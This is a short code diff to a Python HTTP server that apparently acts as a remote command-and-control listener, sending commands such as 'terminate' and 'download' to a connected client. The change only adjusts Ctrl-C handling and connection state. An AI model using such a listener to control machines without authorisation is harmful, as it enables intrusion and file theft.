@@ -57,6 +57,11 @@ interrupt_flag = False
 
 def interrupt_handler(sig, frame):
     global interrupt_flag
+    # If no client is connected, allow normal Ctrl-C to exit
+    if not MyHandler.connection_established:
+        print(f"\n{Colors.YELLOW}[!] Shutting down server...{Colors.RESET}")
+        sys.exit(0)
+    # Otherwise, set interrupt flag for command interruption
     if not interrupt_flag:  # Only print once
         interrupt_flag = True
         print(f"\n{Colors.YELLOW}[!] Interrupt signal received - stopping command...{Colors.RESET}")
@@ -153,6 +158,8 @@ class MyHandler(BaseHTTPRequestHandler):
                 command = "echo Terminate cancelled"
             else:
                 print(f"{Colors.GREEN}[+] Sending terminate command to client{Colors.RESET}")
+                # Mark that we're terminating the client
+                MyHandler.connection_established = False
         
         # Handle download command - capture filename
         if command.strip().startswith('download '):
